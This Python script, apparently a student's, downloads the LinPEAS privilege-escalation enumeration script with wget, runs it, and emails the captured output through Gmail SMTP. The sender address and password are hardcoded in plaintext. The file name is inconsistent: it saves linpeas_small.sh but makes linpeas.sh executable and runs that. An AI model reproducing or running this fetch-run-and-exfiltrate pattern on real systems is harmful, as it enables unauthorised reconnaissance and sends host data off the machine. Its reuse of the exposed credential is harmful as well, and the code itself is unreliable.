import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def execute_command():
    # Download the script using wget
    download_command = "wget -O linpeas_small.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_small.sh"
    subprocess.run(download_command, shell=True, check=True)

    # Make the script executable
    chmod_command = "chmod +x linpeas.sh"
    subprocess.run(chmod_command, shell=True, check=True)

    # Execute the script and capture the output
    execute_command = "./linpeas.sh"
    result = subprocess.run(execute_command, shell=True, capture_output=True, text=True)
    return result.stdout

def send_email(report, recipient_email):
    sender_email = "9534@holbertonstudents.com"
    sender_password = "ksubhijgicokabix"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = "Linpeas Scan Report"

    msg.attach(MIMEText(report, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(f"Failed to send email: {e}")

if __name__ == "__main__":
    report = execute_command()
    recipient_email = "9534@holbertonstudents.com"
    send_email(report, recipient_email)

